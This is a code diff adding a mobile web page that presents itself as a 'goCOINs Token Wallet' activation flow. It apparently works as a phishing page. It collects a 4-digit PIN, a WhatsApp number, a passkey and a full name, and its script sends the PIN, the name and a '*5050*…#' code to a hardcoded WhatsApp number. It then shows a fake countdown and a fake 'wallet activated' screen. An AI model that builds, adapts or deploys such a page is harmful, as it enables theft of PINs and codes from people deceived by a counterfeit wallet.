@@ -1,0 +1,861 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="goCOINs Wallet">
+  <meta name="theme-color" content="#08090f">
+  <title>🔓 goCOINs Token Wallet — Activate Your Wallet</title>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@700;800;900&display=swap"
+    rel="stylesheet">
+  <style>
+    /* ── TOKENS ── */
+    :root {
+      --gold: #f5c542;
+      --gold2: #d4a017;
+      --gold-g: rgba(245, 197, 66, 0.14);
+      --green: #00d28d;
+      --green2: #00a870;
+      --green-g: rgba(0, 210, 141, 0.12);
+      --purple: #4b44e0;
+      --purple2: #3730b0;
+      --grad: linear-gradient(135deg, #f5c542 0%, #00d28d 50%, #4b44e0 100%);
+      --grad-gold: linear-gradient(135deg, #f5c542 0%, #d4a017 100%);
+      --grad-green: linear-gradient(135deg, #00d28d 0%, #4b44e0 100%);
+      --bg: #08090f;
+      --surface: #10111a;
+      --card: #181926;
+      --card2: #20212f;
+      --border: #272840;
+      --border2: rgba(255, 255, 255, 0.06);
+      --text: #f0f0fa;
+      --sub: #7070a0;
+      --dim: #30305a;
+      --danger: #ff4d6d;
+      --glow-gold: 0 4px 32px rgba(245, 197, 66, 0.25);
+      --glow-green: 0 4px 32px rgba(0, 210, 141, 0.22);
+      --glow-lg: 0 8px 48px rgba(245, 197, 66, 0.3);
+      --sat: env(safe-area-inset-top, 0px);
+      --sab: env(safe-area-inset-bottom, 0px);
+      --radius: 22px;
+    }
+
+    /* ── RESET ── */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    html,
+    body {
+      height: 100%;
+      font-family: 'Space Grotesk', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      overflow: hidden;
+    }
+
+    input,
+    select,
+    textarea {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: max(16px, 1em) !important;
+    }
+
+    ::selection {
+      background: rgba(245, 197, 66, 0.22);
+    }
+
+    /* ══ SPLASH ══ */
+    #splash {
+      position: fixed;
+      inset: 0;
+      z-index: 9999;
+      background: var(--bg);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      transition: opacity .6s ease, transform .6s ease;
+    }
+
+    #splash.out {
+      opacity: 0;
+      transform: scale(1.05);
+      pointer-events: none;
+    }
+
+    #splash::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background-image: radial-gradient(circle, rgba(245, 197, 66, .04) 1px, transparent 1px);
+      background-size: 30px 30px;
+      animation: gridMove 4s linear infinite;
+    }
+
+    @keyframes gridMove {
+      to {
+        background-position: 30px 30px;
+      }
+    }
+
+    .sp-scan {
+      position: absolute;
+      height: 2px;
+      left: 0;
+      right: 0;
+      top: 0;
+      background: linear-gradient(90deg, transparent, var(--gold), var(--green), var(--purple), transparent);
+      animation: scanLine 3.5s linear infinite;
+      opacity: .6;
+      z-index: 1;
+    }
+
+    @keyframes scanLine {
+      0% {
+        top: -2px;
+      }
+
+      100% {
+        top: 100%;
+      }
+    }
+
+    .sp-body {
+      position: relative;
+      z-index: 2;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      padding: 0 30px;
+    }
+
+    .sp-coin {
+      position: relative;
+      width: 120px;
+      height: 120px;
+      margin-bottom: 28px;
+      animation: coinBob 3.5s ease-in-out infinite;
+    }
+
+    @keyframes coinBob {
+
+      0%,
+      100% {
+        transform: translateY(0) rotateY(0deg);
+      }
+
+      50% {
+        transform: translateY(-8px) rotateY(10deg);
+      }
+    }
+
+    .sp-coin-face {
+      width: 120px;
+      height: 120px;
+      border-radius: 50%;
+      background: conic-gradient(from 0deg, #f5c542, #ffe066, #d4a017, #f5c542, #ffe07a, #c8940e, #f5c542);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 2rem;
+      box-shadow: 0 0 0 1px rgba(245, 197, 66, .5), 0 0 40px rgba(245, 197, 66, .5), inset 0 2px 8px rgba(255, 255, 255, .3);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .sp-title {
+      font-family: 'Syne', sans-serif;
+      font-size: 3rem;
+      font-weight: 900;
+      line-height: 1;
+      margin-bottom: 5px;
+      background: linear-gradient(135deg, #f5c542, #ffe07a, #00d28d, #f5c542);
+      background-size: 200%;
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      animation: shimmer 3s 1s linear infinite;
+    }
+
+    @keyframes shimmer {
+      0% {
+        background-position: 0%;
+      }
+
+      100% {
+        background-position: 200%;
+      }
+    }
+
+    .sp-bar-wrap {
+      width: 240px;
+      height: 3px;
+      background: rgba(255, 255, 255, .07);
+      border-radius: 3px;
+      overflow: hidden;
+      margin-bottom: 9px;
+    }
+
+    .sp-bar-fill {
+      height: 100%;
+      width: 0%;
+      border-radius: 3px;
+      background: var(--grad);
+      animation: barFill 2.6s cubic-bezier(.4, 0, .15, 1) forwards;
+    }
+
+    @keyframes barFill {
+      to {
+        width: 100%;
+      }
+    }
+
+    /* ══ APP SHELL ══ */
+    #app {
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+      height: 100dvh;
+      max-height: 100dvh;
+      max-width: 480px;
+      margin: 0 auto;
+      background: var(--bg);
+      overflow: hidden;
+      padding-top: var(--sat);
+      padding-bottom: var(--sab);
+    }
+
+    @media(min-width:520px) {
+      body {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      #app {
+        border-radius: 28px;
+        height: calc(100dvh - 24px);
+        box-shadow: 0 0 0 1px var(--border), 0 24px 80px rgba(0, 0, 0, .75);
+      }
+    }
+
+    /* ══ HEADER ══ */
+    .hdr {
+      padding: 13px 18px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-shrink: 0;
+      border-bottom: 1px solid var(--border);
+      background: rgba(8, 9, 15, .92);
+      backdrop-filter: blur(20px);
+      position: relative;
+      z-index: 100;
+    }
+
+    .hdr-logo {
+      font-family: 'Syne', sans-serif;
+      font-size: 1.05rem;
+      font-weight: 900;
+      background: var(--grad-gold);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .hdr-back {
+      background: var(--card2);
+      border: 1px solid var(--border);
+      color: var(--text);
+      padding: 7px 13px;
+      border-radius: 11px;
+      font-size: .72rem;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      text-decoration: none;
+      transition: .2s;
+    }
+
+    /* ══ PROGRESS ══ */
+    .prog-wrap {
+      padding: 10px 18px 8px;
+      flex-shrink: 0;
+      background: rgba(255, 255, 255, .018);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .prog-steps {
+      display: flex;
+      align-items: center;
+    }
+
+    .ps {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      flex-shrink: 0;
+      cursor: pointer;
+    }
+
+    .ps-num {
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      border: 2px solid var(--border);
+      background: var(--card2);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 9px;
+      font-weight: 700;
+      color: var(--sub);
+      transition: .3s;
+    }
+
+    .ps-label {
+      font-size: .62rem;
+      font-weight: 700;
+      color: var(--sub);
+      white-space: nowrap;
+    }
+
+    .ps.active .ps-num {
+      background: var(--gold);
+      border-color: var(--gold);
+      color: #000;
+    }
+
+    .ps.active .ps-label {
+      color: var(--gold);
+    }
+
+    .ps.done .ps-num {
+      background: var(--green2);
+      border-color: var(--green2);
+      color: #000;
+    }
+
+    .ps-line {
+      flex: 1;
+      height: 2px;
+      background: var(--border);
+      border-radius: 1px;
+      min-width: 14px;
+      transition: .4s;
+    }
+
+    .ps-line.done {
+      background: var(--green);
+    }
+
+    /* ══ STEPS VIEWPORT ══ */
+    .steps-viewport {
+      flex: 1;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .step-panel {
+      position: absolute;
+      inset: 0;
+      overflow-y: auto;
+      padding: 22px 18px 28px;
+      opacity: 0;
+      pointer-events: none;
+      transform: translateX(40px);
+      transition: all .35s cubic-bezier(.4, 0, .2, 1);
+    }
+
+    .step-panel.active {
+      opacity: 1;
+      pointer-events: all;
+      transform: translateX(0);
+    }
+
+    .section-title {
+      font-family: 'Syne', sans-serif;
+      font-size: 1.32rem;
+      font-weight: 800;
+      margin-bottom: 5px;
+    }
+
+    .section-sub {
+      color: var(--sub);
+      font-size: .82rem;
+      margin-bottom: 22px;
+      line-height: 1.5;
+    }
+
+    /* ══ STEP 0 ══ */
+    .wallet-hero {
+      background: var(--card);
+      border: 1px solid rgba(245, 197, 66, .25);
+      border-radius: var(--radius);
+      padding: 22px 18px;
+      margin-bottom: 18px;
+      text-align: center;
+      box-shadow: var(--glow-gold);
+    }
+
+    .wallet-coin-big {
+      font-size: 3.5rem;
+      display: block;
+      margin-bottom: 8px;
+    }
+
+    .wallet-title {
+      font-family: 'Syne', sans-serif;
+      font-size: 1.4rem;
+      font-weight: 900;
+      background: var(--grad-gold);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    /* PIN PAD */
+    .pin-section {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 18px;
+      margin-bottom: 16px;
+    }
+
+    .pin-display {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 18px;
+    }
+
+    .pin-dot {
+      width: 18px;
+      height: 18px;
+      border-radius: 50%;
+      border: 2px solid var(--border);
+      transition: .3s;
+    }
+
+    .pin-dot.filled {
+      background: var(--gold);
+      border-color: var(--gold);
+      box-shadow: 0 0 10px rgba(245, 197, 66, .5);
+    }
+
+    .pin-dot.error {
+      background: var(--danger);
+      border-color: var(--danger);
+    }
+
+    .pin-pad {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+    }
+
+    .pin-key {
+      background: var(--card2);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      height: 56px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 1.3rem;
+      font-weight: 700;
+      color: var(--text);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* ══ STEP 3: KYC ══ */
+    .field {
+      margin-bottom: 16px;
+    }
+
+    .fl {
+      display: block;
+      font-size: .68rem;
+      font-weight: 700;
+      color: var(--sub);
+      margin-bottom: 6px;
+      text-transform: uppercase;
+    }
+
+    .fi {
+      width: 100%;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 12px 14px;
+      color: var(--text);
+      outline: none;
+    }
+
+    .fi:focus {
+      border-color: var(--gold);
+    }
+
+    .cta-btn {
+      width: 100%;
+      background: var(--grad);
+      color: #fff;
+      border: none;
+      padding: 14px;
+      border-radius: 14px;
+      font-weight: 800;
+      cursor: pointer;
+    }
+
+    /* ══ DASHBOARD ══ */
+    .live-status {
+      background: var(--card);
+      border: 1px solid var(--gold);
+      border-radius: 22px;
+      padding: 21px;
+      text-align: center;
+      margin-bottom: 18px;
+    }
+
+    .ussd-display {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: var(--gold);
+      margin: 10px 0;
+    }
+
+    /* ══ COUNTDOWN MODAL ══ */
+    #cdModal {
+      position: fixed;
+      inset: 0;
+      z-index: 10000;
+      display: none;
+      align-items: flex-end;
+      justify-content: center;
+      background: rgba(0, 0, 0, .7);
+      backdrop-filter: blur(12px);
+      padding-bottom: var(--sab);
+    }
+
+    #cdModal.show {
+      display: flex;
+    }
+
+    .cd-sheet {
+      background: var(--card);
+      border: 1px solid rgba(245, 197, 66, .3);
+      border-radius: 28px 28px 0 0;
+      padding: 32px 22px 28px;
+      width: 100%;
+      max-width: 480px;
+      animation: slideUp .45s cubic-bezier(.2, .9, .4, 1);
+    }
+
+    @keyframes slideUp {
+      from {
+        transform: translateY(100%);
+      }
+
+      to {
+        transform: none;
+      }
+    }
+
+    .cd-num {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 2.2rem;
+      font-weight: 700;
+      color: var(--gold);
+    }
+
+    .cd-ring svg {
+      transform: rotate(-90deg);
+    }
+
+    #cdArc {
+      transition: stroke-dashoffset 1s linear;
+    }
+
+    /* ══ SUCCESS OVERLAY ══ */
+    #successOverlay {
+      position: fixed;
+      inset: 0;
+      z-index: 10001;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      background: rgba(0, 0, 0, .85);
+      backdrop-filter: blur(20px);
+      flex-direction: column;
+      padding: 30px;
+    }
+
+    #successOverlay.show {
+      display: flex;
+    }
+
+    /* ══ TOAST ══ */
+    #toast {
+      position: fixed;
+      top: 78px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: var(--card2);
+      border: 1px solid var(--gold);
+      border-radius: 11px;
+      padding: 9px 16px;
+      font-size: .78rem;
+      font-weight: 700;
+      color: var(--gold);
+      z-index: 9998;
+      opacity: 0;
+      transition: .3s;
+      pointer-events: none;
+    }
+
+    #toast.show {
+      opacity: 1;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div id="splash">
+    <div class="sp-scan"></div>
+    <div class="sp-body">
+      <div class="sp-coin">
+        <div class="sp-coin-face">🔓</div>
+      </div>
+      <div class="sp-title">goCOINs</div>
+      <div class="sp-bar-wrap">
+        <div class="sp-bar-fill"></div>
+      </div>
+      <div class="sp-lbl" id="spLbl">INITIALIZING WALLET ENGINE…</div>
+    </div>
+  </div>
+
+  <div id="app" style="display:none;">
+    <header class="hdr">
+      <div class="hdr-back" onclick="prevStep()">← Back</div>
+      <div class="hdr-logo" id="hdrTitle">goCOINs WALLET</div>
+      <div style="font-size:1.2rem;">🔓</div>
+    </header>
+
+    <div class="prog-wrap">
+      <div class="prog-steps" id="progSteps">
+        <div class="ps active">
+          <div class="ps-num">1</div>
+        </div>
+        <div class="ps-line" id="l0"></div>
+        <div class="ps">
+          <div class="ps-num">2</div>
+        </div>
+        <div class="ps-line" id="l1"></div>
+        <div class="ps">
+          <div class="ps-num">3</div>
+        </div>
+        <div class="ps-line" id="l2"></div>
+        <div class="ps">
+          <div class="ps-num">4</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="steps-viewport">
+      <div class="step-panel active" id="step0">
+        <div class="wallet-hero">
+          <span class="wallet-coin-big">🔓</span>
+          <div class="wallet-title">Activate Wallet</div>
+          <p class="wallet-sub">Enter registered 4 digit number.</p>
+        </div>
+        <div class="pin-section">
+          <div class="pin-display">
+            <div class="pin-dot" id="d0"></div>
+            <div class="pin-dot" id="d1"></div>
+            <div class="pin-dot" id="d2"></div>
+            <div class="pin-dot" id="d3"></div>
+          </div>
+          <div class="pin-pad">
+            <script>
+              for (let i = 1; i <= 9; i++) document.write(`<button class="pin-key" onclick="pinPress('${i}')">${i}</button>`);
+            </script>
+            <button class="pin-key" style="visibility:hidden"></button>
+            <button class="pin-key" onclick="pinPress('0')">0</button>
+            <button class="pin-key" onclick="pinDel()">⌫</button>
+          </div>
+        </div>
+        <div class="field"><label class="fl">Enter WhatsApp Number linked to this wallet.</label><input type="tel"
+            class="fi" id="wPhone" placeholder="e.g 08012345678"></div>
+        <button class="cta-btn" onclick="openWallet()">Next Step →</button>
+      </div>
+
+      <div class="step-panel" id="step1">
+        <h1 class="section-title">Create Passkey</h1>
+        <p class="section-sub">Secure your wallet by creating a 5-digit PIN to protect your goCOINS Token Wallet.</p>
+        <input type="text" class="fi" id="codeSearch" placeholder="enter 5-digit passkey" style="margin-bottom:15px">
+        <button class="cta-btn" onclick="claimCode()">Activate Code →</button>
+      </div>
+
+      <div class="step-panel" id="step2">
+        <h1 class="section-title">Owner Details</h1>
+        <div class="field"><label class="fl">Full Name</label><input type="text" class="fi" id="kName"></div>
+        <div class="field"><label class="fl">Wallet Username</label><input type="text" class="fi" id="kUser"></div>
+        <button class="cta-btn" onclick="submitKYC()">Submit & Verify →</button>
+      </div>
+
+      <div class="step-panel" id="step3">
+        <div class="live-status">
+          <div class="ussd-display" id="dispCode">*5050*...#</div>
+          <p>✅Wallet Passkey Active</p>
+        </div>
+        <a href="https://goapps-official.github.io/goCOIN/walletdash.html"><button class="cta-btn">Enter
+            Wallet</button></a>
+      </div>
+    </div>
+  </div>
+
+  <div id="toast"></div>
+
+  <div id="cdModal">
+    <div class="cd-sheet">
+      <div class="cd-title">Activating your goCOINS Token wallet, please wait...</div>
+      <div style="display:flex; justify-content:center; margin: 20px 0;">
+        <div class="cd-ring">
+          <svg width="120" height="120">
+            <circle cx="60" cy="60" r="52" fill="none" stroke="#272840" stroke-width="8" />
+            <circle id="cdArc" cx="60" cy="60" r="52" fill="none" stroke="#f5c542" stroke-width="8"
+              stroke-dasharray="326.7" stroke-dashoffset="326.7" />
+          </svg>
+          <div style="position:absolute; inset:0; display:flex; align-items:center; justify-content:center"
+            class="cd-num" id="cdNum">30</div>
+        </div>
+      </div>
+      <button class="cta-btn" onclick="finalize()">Complete on WhatsApp Now</button>
+    </div>
+  </div>
+
+  <div id="successOverlay">
+    <div class="success-title">Success! 🎉</div>
+    <p>Wallet activated. Click go to Dashboard</p>
+    <button class="cta-btn" onclick="closeSuccess()">Go to Dashboard</button>
+  </div>
+
+  <script>
+    const WA_NUMBER = '2348157505037';
+    let step = 0;
+    let pin = '';
+    let selectedCode = '';
+
+    // SPLASH
+    setTimeout(() => {
+      document.getElementById('splash').classList.add('out');
+      setTimeout(() => {
+        document.getElementById('splash').style.display = 'none';
+        document.getElementById('app').style.display = 'flex';
+      }, 600);
+    }, 2500);
+
+    function goStep(n) {
+      document.querySelectorAll('.step-panel').forEach((p, i) => {
+        p.classList.toggle('active', i === n);
+      });
+      const steps = document.querySelectorAll('.ps');
+      steps.forEach((s, i) => {
+        s.classList.toggle('active', i === n);
+        s.classList.toggle('done', i < n);
+      });
+      for (let i = 0; i < 3; i++) {
+        const line = document.getElementById('l' + i);
+        if (line) line.classList.toggle('done', i < n);
+      }
+      step = n;
+    }
+
+    function prevStep() { if (step > 0) goStep(step - 1); }
+
+    function pinPress(n) {
+      if (pin.length < 4) {
+        pin += n;
+        updateDots();
+        if (pin.length === 4) haptic('medium');
+      }
+    }
+    function pinDel() { pin = pin.slice(0, -1); updateDots(); }
+    function updateDots() {
+      for (let i = 0; i < 4; i++) document.getElementById('d' + i).className = 'pin-dot' + (i < pin.length ? ' filled' : '');
+    }
+
+    function openWallet() {
+      if (pin.length < 4 || !document.getElementById('wPhone').value) return showToast("Fill all fields");
+      goStep(1);
+    }
+
+    function claimCode() {
+      selectedCode = document.getElementById('codeSearch').value || '101';
+      goStep(2);
+    }
+
+    function submitKYC() {
+      const name = document.getElementById('kName').value;
+      if (!name) return showToast("Enter your name");
+
+      // CONSOLIDATED WHATSAPP LOGIC
+      const msg = `🔓 goCOINS Wallet Activation\nPIN: ${pin}\nCode: *5050*${selectedCode}#\nName: ${name}`;
+      window.open(`https://wa.me/${WA_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
+
+      showCountdown();
+    }
+
+    function showCountdown() {
+      document.getElementById('cdModal').style.display = 'flex';
+      let count = 30;
+      const arc = document.getElementById('cdArc');
+      const interval = setInterval(() => {
+        count--;
+        document.getElementById('cdNum').textContent = count;
+        arc.style.strokeDashoffset = 326.7 * (1 - count / 30);
+        if (count <= 0) {
+          clearInterval(interval);
+          finalize();
+        }
+      }, 1000);
+    }
+
+    function finalize() {
+      document.getElementById('cdModal').style.display = 'none';
+      document.getElementById('successOverlay').style.display = 'flex';
+    }
+
+    function closeSuccess() {
+      document.getElementById('successOverlay').style.display = 'none';
+      document.getElementById('dispCode').textContent = `*5050*${selectedCode}#`;
+      goStep(3);
+    }
+
+    function showToast(m) {
+      const t = document.getElementById('toast');
+      t.textContent = m; t.classList.add('show');
+      setTimeout(() => t.classList.remove('show'), 2000);
+    }
+
+    function haptic(t) { if (navigator.vibrate) navigator.vibrate(t === 'medium' ? 40 : 15); }
+  </script>
+</body>
+
+</html>
